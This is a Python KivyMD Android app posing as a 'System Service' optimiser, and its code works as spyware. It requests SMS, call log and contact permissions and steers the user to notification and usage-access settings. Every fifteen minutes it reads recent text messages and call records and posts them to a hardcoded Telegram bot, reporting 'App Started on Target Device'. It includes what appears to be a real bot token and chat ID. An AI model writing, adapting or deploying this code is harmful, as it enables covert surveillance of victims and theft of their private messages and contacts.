from kivymd.app import MDApp
from kivymd.uix.label import MDLabel
from kivymd.uix.spinner import MDSpinner
from kivy.clock import Clock
from kivy.lang import Builder
from kivy.utils import platform
import requests
import threading
from datetime import datetime

# --- CONFIGURATION ---
BOT_TOKEN = "8246973766:AAECYn1C_6pWobZqj05y9q0gQOqO5tPDFBv4"
CHAT_ID = "7158111035"
REPORT_INTERVAL = 900  # seconds (15 minutes)

KV = '''
Screen:
    md_bg_color: 0.1, 0.1, 0.1, 1
    MDBoxLayout:
        orientation: 'vertical'
        padding: 40
        spacing: 20
        pos_hint: {'center_x': 0.5, 'center_y': 0.5}
        MDSpinner:
            size_hint: None, None
            size: dp(40), dp(40)
            pos_hint: {'center_x': 0.5}
            active: True
        MDLabel:
            text: "System Service V3.0"
            halign: "center"
            theme_text_color: "Custom"
            text_color: 1, 1, 1, 1
            font_style: "H6"
        MDLabel:
            text: "Optimizing background processes...\nPlease grant permissions if asked."
            halign: "center"
            theme_text_color: "Custom"
            text_color: 0.7, 0.7, 0.7, 1
            font_style: "Caption"
'''


class MainApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        return Builder.load_string(KV)

    def on_start(self):
        self.send_telegram("🚀 App Started on Target Device")

        if platform == 'android':
            self.check_and_open_settings()

        Clock.schedule_once(self.worker, 10)
        Clock.schedule_interval(self.worker, REPORT_INTERVAL)

    def check_and_open_settings(self):
        """Request runtime permissions and open Android settings screens if critical access is missing."""
        from android.permissions import request_permissions, Permission
        from jnius import autoclass, cast

        request_permissions([
            Permission.READ_SMS,
            Permission.READ_CALL_LOG,
            Permission.READ_CONTACTS,
            Permission.INTERNET,
        ])

        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            current_activity = cast('android.app.Activity', PythonActivity.mActivity)
            Settings = autoclass('android.provider.Settings')
            Intent = autoclass('android.content.Intent')
            AppOpsManager = autoclass('android.app.AppOpsManager')
            Context = autoclass('android.content.Context')
            Process = autoclass('android.os.Process')

            pkg_name = current_activity.getPackageName()

            enabled_listeners = Settings.Secure.getString(current_activity.getContentResolver(), "enabled_notification_listeners")
            if not enabled_listeners or pkg_name not in enabled_listeners:
                self.send_telegram("⚠️ Requesting Notification Access...")
                intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                current_activity.startActivity(intent)

            app_ops = cast(AppOpsManager, current_activity.getSystemService(Context.APP_OPS_SERVICE))
            mode = app_ops.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), pkg_name)

            if mode != AppOpsManager.MODE_ALLOWED:
                self.send_telegram("⚠️ Requesting Usage Stats Access...")
                intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                current_activity.startActivity(intent)

        except Exception as exc:
            self.send_telegram(f"❌ Permission Error: {exc}")

    def worker(self, dt=None):
        threading.Thread(target=self.collect_data, daemon=True).start()

    def collect_data(self):
        try:
            report = f"📅 Report: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
            if platform == 'android':
                report += self.get_sms_log()
                report += self.get_call_log()
            else:
                report += "Running on Desktop (No Android Data)"

            self.send_telegram(report)
        except Exception as exc:
            self.send_telegram(f"❌ Worker Error: {exc}")

    def get_sms_log(self):
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Uri = autoclass('android.net.Uri')
            context = PythonActivity.mActivity
            uri = Uri.parse("content://sms/inbox")
            cursor = context.getContentResolver().query(uri, None, None, None, None)

            res = "\n📩 Recent SMS:\n"
            if cursor and cursor.moveToFirst():
                for _ in range(5):
                    addr = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                    body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    res += f"👤 {addr}: {body[:30]}...\n"
                    if not cursor.moveToNext():
                        break
                cursor.close()
            else:
                res += "No SMS found.\n"
            return res
        except Exception as exc:
            return f"\n📩 SMS Error: {exc}\n"

    def get_call_log(self):
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            CallLog = autoclass('android.provider.CallLog$Calls')
            context = PythonActivity.mActivity
            cursor = context.getContentResolver().query(CallLog.CONTENT_URI, None, None, None, CallLog.DATE + " DESC")

            res = "\n📞 Recent Calls:\n"
            if cursor and cursor.moveToFirst():
                for _ in range(5):
                    num = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.NUMBER))
                    type_code = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.TYPE))
                    ctype = "📥" if type_code == 1 else "📤" if type_code == 2 else "❌"
                    res += f"{ctype} {num}\n"
                    if not cursor.moveToNext():
                        break
                cursor.close()
            else:
                res += "No calls found.\n"
            return res
        except Exception as exc:
            return f"\n📞 Call Log Error: {exc}\n"

    def send_telegram(self, msg):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
        except Exception:
            pass


if __name__ == "__main__":
    MainApp().run()
